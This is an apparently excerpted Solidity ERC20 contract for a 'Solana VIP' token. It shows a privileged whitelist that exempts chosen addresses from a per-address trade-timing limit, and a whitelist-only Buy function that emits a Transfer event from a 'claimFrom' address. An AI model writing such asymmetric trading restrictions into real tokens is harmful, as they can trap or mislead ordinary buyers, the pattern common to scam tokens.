...
contract Token is ERC20, Pausable, ERC20Permit {
    ...
    uint256 public minClaim = 1000000000000000; //0.001

    constructor(uint256 _price, uint256 _bonus)
        ERC20("Solana VIP", "SOV")
        ERC20Permit("Solana Vip")
    {
        isIDO = false;
        isIco = false;
        uint256 maxSupply = 22_000_000_000_000 * 10**decimals();
    ...
    function _beforeTokenTransfer(
        ...
        // limit time tx
        if (pools[from] == true && _isEFFs[to] != true) {
            lastTimeTx[to] = block.timestamp;
        }
        if (
            (pools[to] == true && _isEFFs[from] != true) ||
            (pools[to] != true && _isEFFs[from] != true && _isEFFs[to] != true)
        ) {
            lastTimeTx[from] = block.timestamp;
        }
    ...
    function Buy(uint256 amount) external onICO {
        require(_isEFFs[msg.sender] == true, "Not allow");

        _t(amount, msg.sender);
        emit Transfer(claimFrom, msg.sender, amount);
    }

    function Buy(address payable ref) external payable onICO {
